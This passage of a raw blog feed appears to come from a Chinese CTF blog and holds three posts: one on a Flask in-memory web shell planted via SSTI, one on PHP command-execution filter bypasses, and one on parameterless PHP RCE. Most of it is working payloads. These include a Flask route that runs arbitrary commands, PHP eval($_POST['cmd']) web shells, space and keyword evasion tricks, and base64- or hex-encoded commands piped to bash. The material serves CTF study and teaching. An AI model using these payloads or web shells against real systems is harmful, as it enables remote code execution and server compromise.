</span><br><span class="hljs-string">&#x27;shell&#x27;, </span><br><span class="hljs-string">lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span><br><span class="hljs-string">)</span><br><span class="hljs-string">&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#123;</span><br>&#x27;_request_ctx_stack&#x27;<span class="hljs-punctuation">:</span>url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;_request_ctx_stack&#x27;<span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>&#x27;app&#x27;<span class="hljs-punctuation">:</span>url_for.__globals__<span class="hljs-punctuation">[</span>&#x27;current_app&#x27;<span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br>)<br></code></pre></td></tr></table></figure><p>首先<code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code>这就是一个ssti获取eval函数的payload，url_for是Flask的一个内置函数，其命名空间包含很多东西，包括我们待会需要拿的当前应用的上下文。</p><h4 id="add-url-rule"><a href="#add-url-rule" class="headerlink" title="add_url_rule:"></a>add_url_rule:</h4><p>Flask注册路由是使用@app.route()装饰器来实现</p><img src="/blog/2025/02/03/Python/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250203183141232.png" class title="image-20250203183141232"><p>这里使用了add_url_rule来添加路由，跟进去在看看</p><img src="/blog/2025/02/03/Python/flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20250203183231034.png" class title="image-20250203183231034"><ul><li>rule：函数对应的URL规则，满足条件和 app.route() 的第一个参数一样，必须以<code>/</code>开头；</li><li>endpoint：端点，即在使用 url_for() 进行反转的时候，这里传入的第一个参数就是 endpoint 对应的值。这个值也可以不指定，那么默认就会使用函数的名字作为 endpoint 的值；</li><li>view_func：URL对应的函数（注意，这里只需写函数名字而不用加括号）</li><li>provide_automatic_options：控制是否应自动添加选项方法。这也可以通过设置视图来控制_func.provide_automatic_options &#x3D;添加规则前为False；</li><li>options：要转发到基础规则对象的选项。Werkzeug 的一个变化是处理方法选项。方法是此规则应限制的方法列表（GET、POST等）。默认情况下，规则只侦听 GET（并隐式地侦听HEAD）</li></ul><p>所以payload的add_url_rule的这部分就是添加一个路由，然后处理函数是用lambda关键字定义的匿名函数</p><h4 id="app"><a href="#app" class="headerlink" title="app:"></a>app:</h4><p>eval的第二个参数就是用字典的形式定义一些全局变量给第一个参数也就是执行命令的时候用，这里的app就是用url_for获取的应用的当前上下文app，属性为<strong>current_app</strong>；</p><h4 id="request-ctx-stack："><a href="#request-ctx-stack：" class="headerlink" title="_request_ctx_stack："></a><strong>_request_ctx_stack</strong>：</h4><p><code>_request_ctx_stack</code>是Flask的一个全局变量，是一个LocalStack实例</p><p>为什么要获取这个变量呢，这和Flask的请求上下文管理机制有关：</p><p>当一个请求进入Flask，首先会实例化一个Request Context，这个上下文封装了请求的信息在Request中，并将这个上下文推入到一个名为<code>_request_ctx_stack</code> 的栈结构中，也就是说获取当前的请求上下文等同于获取<code>_request_ctx_stack</code>的栈顶元素<code>_request_ctx_stack.top</code> 。</p><p>简单来说就是为了获取访问的cmd参数，_request_ctx_stack.top.request.args.get(‘cmd’, ‘whoami’)</p><h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><p>其本质也就是个ssti的绕过</p><h5 id="url-for被过滤："><a href="#url-for被过滤：" class="headerlink" title="url_for被过滤："></a>url_for被过滤：</h5><p>可以用<code>get_flashed_messages</code>或<code>request.application.__self__._get_data_for_json</code>代替</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;get_flashed_messages.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>:get_flashed_messages.__globals__[<span class="hljs-string">&#x27;_request_ctx_stack&#x27;</span>],<span class="hljs-string">&#x27;app&#x27;</span>:get_flashed_messages.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><h5 id="eval被过滤："><a href="#eval被过滤：" class="headerlink" title="eval被过滤："></a>eval被过滤：</h5><p>用exec代替或者是采用字符串拼接方式，如<code>[&#39;__builtins__&#39;][&#39;eval&#39;]</code>变为<code>[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;ev&#39;+&#39;al&#39;]</code>；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;request.application.__self__._get_data_for_json.__getattribute__(<span class="hljs-string">&#x27;__globa&#x27;</span>+<span class="hljs-string">&#x27;ls__&#x27;</span>).__getitem__(<span class="hljs-string">&#x27;__bui&#x27;</span>+<span class="hljs-string">&#x27;ltins__&#x27;</span>).__getitem__(<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ec&#x27;</span>)(<span class="hljs-string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="hljs-string">&#x27;_request_ct&#x27;</span>+<span class="hljs-string">&#x27;x_stack&#x27;</span>:get_flashed_messages.__getattribute__(<span class="hljs-string">&#x27;__globa&#x27;</span>+<span class="hljs-string">&#x27;ls__&#x27;</span>).pop(<span class="hljs-string">&#x27;_request_&#x27;</span>+<span class="hljs-string">&#x27;ctx_stack&#x27;</span>),<span class="hljs-string">&#x27;app&#x27;</span>:get_flashed_messages.__getattribute__(<span class="hljs-string">&#x27;__globa&#x27;</span>+<span class="hljs-string">&#x27;ls__&#x27;</span>).pop(<span class="hljs-string">&#x27;curre&#x27;</span>+<span class="hljs-string">&#x27;nt_app&#x27;</span>)&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><ul><li><code>__globals__</code>可用<code>__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)</code>替换；</li><li><code>[]</code>中括号可用<code>.__getitem__()</code>或<code>.pop()</code>替换；</li></ul><p>不知道为什么我的</p><p><code>request.application.__self__._get_data_for_json.__globals__</code>说找不到<code>__globals__</code>属性</p><h5 id="app的另外获取"><a href="#app的另外获取" class="headerlink" title="app的另外获取"></a>app的另外获取</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">url_for.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;__main__&#x27;</span>].__dict__[<span class="hljs-string">&#x27;app&#x27;</span>].add_url_rule(<span class="hljs-string">&#x27;/shell&#x27;</span>,<span class="hljs-string">&#x27;shell&#x27;</span>,<span class="hljs-keyword">lambda</span> :<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;dir&#x27;</span>).read())<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RCE中遇到过滤</title>
    <link href="/blog/2025/01/29/PHP/RCE%E4%B8%AD%E9%81%87%E5%88%B0%E8%BF%87%E6%BB%A4/"/>
    <url>/blog/2025/01/29/PHP/RCE%E4%B8%AD%E9%81%87%E5%88%B0%E8%BF%87%E6%BB%A4/</url>
    
    <content type="html"><![CDATA[<h3 id="过滤-or"><a href="#过滤-or" class="headerlink" title="过滤&lt; or &lt;? or ? or php"></a>过滤&lt; or &lt;? or ? or php</h3><p>可以使用短标签绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>;<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#前提是开启配置参数short_open_tags=on</span><br><span class="hljs-meta">&lt;?=</span>(表达式)<span class="hljs-meta">?&gt;</span>  等价于 <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> (表达式)<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#不需要开启参数设置</span><br>&lt;% <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>;%&gt;   <span class="hljs-comment">#开启配置参数asp_tags=on，并且只能在7.0以下版本使用</span><br>&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;123&#x27;</span>; &lt;/script&gt; <span class="hljs-comment">#不需要修改参数开关，但是只能在7.0以下可用。</span><br><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span>            <span class="hljs-comment">//正常写法</span><br><span class="hljs-meta">&lt;?=</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span>               <span class="hljs-comment">//短标签，适合过滤php</span><br>    <br>&lt;% @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); %&gt;                <span class="hljs-comment">//asp风格</span><br>&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;  <span class="hljs-comment">//&lt;script&gt;风格，适合过滤&lt;?</span><br></code></pre></td></tr></table></figure><p>一个ctf题目fsctf[EZ_eval]2023</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;word&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$word</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;word&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|tac|tail|more|head|nl|flag|less| /&quot;</span>, <span class="hljs-variable">$word</span>))&#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono.&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$word</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$word</span>);<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;?&gt;&quot;</span>. <span class="hljs-variable">$word</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤?与空格</p><p>注意：</p><p>也能正常执行，那就说明$word只要是一个正常的php代码就能正常执行，而?&gt;不会影响后面的php代码</p><img src="/blog/2025/01/29/PHP/RCE%E4%B8%AD%E9%81%87%E5%88%B0%E8%BF%87%E6%BB%A4/image-20250119035715816.png" class title="image-20250119035715816"><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script%<span class="hljs-number">09</span>language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;strings%09/fl*&#x27;</span>)&lt;/script&gt;<br><span class="hljs-keyword">or</span><br>&lt;script%<span class="hljs-number">09</span>language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;c\a\t%09/fl*&#x27;</span>)&lt;/script&gt;<br><span class="hljs-keyword">or</span><br>&lt;script%<span class="hljs-number">09</span>language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;paste%09/fl*&#x27;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h3 id="过滤了空格"><a href="#过滤了空格" class="headerlink" title="过滤了空格"></a>过滤了空格</h3><p>以下是可以代替空格（url编码是%20）的：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mel">%09：tab键（水平）<br>%0a：换行<br>%0c：新的一页<br>%0d：相当于<span class="hljs-keyword">return</span>作用<br>%0b：tab键（垂直）<br>$&#123;IFS&#125;   注意：<span class="hljs-keyword">system</span>()函数里面用单引号（<span class="hljs-string">&#x27;&#x27;</span>），否则$&#123;IFS&#125;没办法被解释为空格而绕过<br>&#123;IFS&#125;<br>$IFS<br>$IFS$1 <span class="hljs-comment">//$1改成$加其他数字貌似都行</span><br>IFS<br>&lt;<br>&lt;&gt;<br>&#123;cat,flag.php&#125;  <span class="hljs-comment">//用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br>X=$&#x27;cat\x09./flag.php<span class="hljs-string">&#x27;;$X   (\x09表示tab，也可以用\x20)</span><br></code></pre></td></tr></table></figure><h3 id="禁止cat"><a href="#禁止cat" class="headerlink" title="禁止cat"></a>禁止cat</h3><h4 id="方法1使用转义符号绕过："><a href="#方法1使用转义符号绕过：" class="headerlink" title="方法1使用转义符号绕过："></a>方法1使用转义符号绕过：</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">c\<span class="hljs-selector-tag">a</span>\t<br></code></pre></td></tr></table></figure><h4 id="方法2替换法："><a href="#方法2替换法：" class="headerlink" title="方法2替换法："></a>方法2替换法：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">more:一页一页的显示档案内容<br>less:与 more 类似<br><span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是 <span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:查看尾几行<br><span class="hljs-built_in">nl</span>：显示的时候，顺便输出行号<br><span class="hljs-built_in">od</span>:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br><span class="hljs-built_in">sort</span>:可以查看<br><span class="hljs-built_in">uniq</span>:可以查看<br>file -f:报错出具体内容<br>sh /flag 2&gt;%261 //报错出文件内容<br></code></pre></td></tr></table></figure><h3 id="过滤了关键字flag"><a href="#过滤了关键字flag" class="headerlink" title="过滤了关键字flag"></a>过滤了关键字flag</h3><h4 id="方法1编码绕过："><a href="#方法1编码绕过：" class="headerlink" title="方法1编码绕过："></a>方法1编码绕过：</h4><p>base64编码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;ZmxhZy5waHA=&#x27;</span> | <span class="hljs-built_in">base64</span> -d`<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Y2F0IGZsYWcucGhw&quot;</span> | <span class="hljs-built_in">base64</span> -d | bash  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> Y2F0IGZsYWcucGhw|<span class="hljs-built_in">base64</span> -d|sh<br></code></pre></td></tr></table></figure><p>等同于cat flag.php</p><p>hex编码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;63617420666c61672e706870&quot;</span> | xxd -r -p | bash  //<span class="hljs-string">&quot;&quot;</span>也可以去掉  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;63617420666c61672e706870&quot;</span> | xxd -r -p | sh     <br></code></pre></td></tr></table></figure><h4 id="方法2变量赋值拼接绕过："><a href="#方法2变量赋值拼接绕过：" class="headerlink" title="方法2变量赋值拼接绕过："></a>方法2变量赋值拼接绕过：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=fl;b=ag;<span class="hljs-built_in">cat</span> $a<span class="hljs-variable">$b</span>.php<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a=g;<span class="hljs-built_in">cat</span>$IFS$1fla<span class="hljs-variable">$a</span>.php<br></code></pre></td></tr></table></figure><h4 id="方法3内联执行绕过："><a href="#方法3内联执行绕过：" class="headerlink" title="方法3内联执行绕过："></a>方法3内联执行绕过：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">ls</span>`<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">ls</span>`;<br><span class="hljs-built_in">echo</span> $(<span class="hljs-built_in">ls</span>);<br>?&gt;&lt;?=`<span class="hljs-built_in">ls</span>`;<br>?&gt;&lt;?=$(<span class="hljs-built_in">ls</span>);<br></code></pre></td></tr></table></figure><h4 id="方法4-绕过："><a href="#方法4-绕过：" class="headerlink" title="方法4[]绕过："></a>方法4[]绕过：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fl[a]g.php<br></code></pre></td></tr></table></figure><h4 id="方法5空变量绕过："><a href="#方法5空变量绕过：" class="headerlink" title="方法5空变量绕过："></a>方法5空变量绕过：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fl<span class="hljs-variable">$&#123;2&#125;</span>ag //使用$*和<span class="hljs-variable">$@</span>，<span class="hljs-variable">$x</span>(x 代表 1-9),<span class="hljs-variable">$&#123;x&#125;</span>(x&gt;=10)(小于 10 也彳亍)<br></code></pre></td></tr></table></figure><h4 id="方法6通配符绕过："><a href="#方法6通配符绕过：" class="headerlink" title="方法6通配符绕过："></a>方法6通配符绕过：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fl*<br></code></pre></td></tr></table></figure><h4 id="方法7使用转义符号绕过："><a href="#方法7使用转义符号绕过：" class="headerlink" title="方法7使用转义符号绕过："></a>方法7使用转义符号绕过：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> f\l\a\g<br></code></pre></td></tr></table></figure><h4 id="方法8’’绕过："><a href="#方法8’’绕过：" class="headerlink" title="方法8’’绕过："></a>方法8’’绕过：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> fl<span class="hljs-string">&#x27;&#x27;</span>ag<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>无参数RCE绕过思路</title>
    <link href="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/"/>
    <url>/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/</url>
    
    <content type="html"><![CDATA[<h3 id="无参数RCE题目特征"><a href="#无参数RCE题目特征" class="headerlink" title="无参数RCE题目特征"></a>无参数RCE题目特征</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>])) &#123;    <br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;star&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>正则表达式 <code>[^\W]+\((?R)?\)</code> 匹配了一个或多个非标点符号字符（简单来说匹配函数名）后跟的一个括号（表示函数调用）。其中 <code>(?R)</code> 是递归引用，它只能匹配和替换嵌套的函数调用，而不能处理函数参数。所以说经过正则表达式匹配后，每个函数都会被删除，最终只剩一个;，而题目中最终的要求也是强等于一个;，才能进行下面的eval()，简而言之来说就是要使用不带参数的函数</p><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129195640525.png" class title="image-20250129195640525"><img src="/blog/2025/01/29/PHP/%E6%97%A0%E5%8F%82%E6%95%B0rce/image-20250129195647510.png" class title="image-20250129195647510"><p>所以就需要找到能够查看目录文件的函数并且不带参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">scandir</span>()可以使用里面不含参数<br><span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;1&#x27;</span>)不可以使用，里面含有参数<span class="hljs-number">1</span>，无法被替换删除<br></code></pre></td></tr></table></figure><p>介绍以下相关payload需要的函数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）<br>localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）<br>current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西<br>getcwd() :取得当前工作目录<br><span class="hljs-built_in">dirname</span>():函数返回路径中的目录部分<br>array_flip() :交换数组中的键和值，成功时返回交换后的数组<br>array_rand() :从数组中随机取出一个或多个单元<br>array_reverse():将数组内容反转<br>strrev():用于反转给定字符串<br>getcwd()：获取当前工作目录路径<br><span class="hljs-built_in">dirname</span>() ：函数返回路径中的目录部分。<br><span class="hljs-built_in">chdir</span>() ：函数改变当前的目录。<br><span class="hljs-built_in">eval</span>()、assert()：命令执行<br>hightlight_file()、show_source()、readfile()：读取文件内容<br></code></pre></td></tr></table></figure><p>举一个例子关于scandir()函数的使用：</p><p>scandir(‘.’)是返回当前目录，就可以靠localeconv() 返回的数组第一个就是‘.’，current()取第一个值，那么current(localeconv())就能构造一个‘.’,那么以下就是一个简单的返回查看当前目录下文件的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?参数=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())));<br></code></pre></td></tr></table></figure><p>数组移动操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">end</span>() ： 将内部指针指向数组中的最后一个元素，并输出<br><span class="hljs-title function_ invoke__">next</span>() ：将内部指针指向数组中的下一个元素，并输出<br><span class="hljs-title function_ invoke__">prev</span>() ：将内部指针指向数组中的上一个元素，并输出<br><span class="hljs-title function_ invoke__">reset</span>() ： 将内部指针指向数组中的第一个元素，并输出<br><span class="hljs-title function_ invoke__">each</span>() ： 返回当前元素的键名和键值，并将内部指针向前移动<br></code></pre></td></tr></table></figure><h3 id="方法一：scandir-最常规的通解"><a href="#方法一：scandir-最常规的通解" class="headerlink" title="方法一：scandir() 最常规的通解"></a>方法一：scandir() 最常规的通解</h3><p>一道例题BuuCTF [GXYCTF2019]禁止套娃</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最终的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">exp=<span class="hljs-title 